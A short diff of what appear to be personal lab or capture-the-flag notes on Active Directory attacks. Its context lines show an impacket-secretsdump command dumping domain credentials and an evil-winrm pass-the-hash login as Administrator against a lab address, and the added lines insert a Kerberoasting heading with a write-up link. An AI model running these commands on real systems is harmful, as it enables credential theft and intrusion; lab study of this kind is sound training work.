@@ -151,6 +151,10 @@ $ impacket-secretsdump -just-dc <backup:backup2517860@10.10.63.2>Useful links
 $ evil-winrm -i 10.10.63.2 -u Administrator -H e4876a80a723612986d7609aa5ebc12b 
 
 
+## Kerberoasting attack
+
+> https://shamsher-khan-404.medium.com/attacking-kerberos-tryhackme-writeup-97cec6b563d2
+
 
 
 
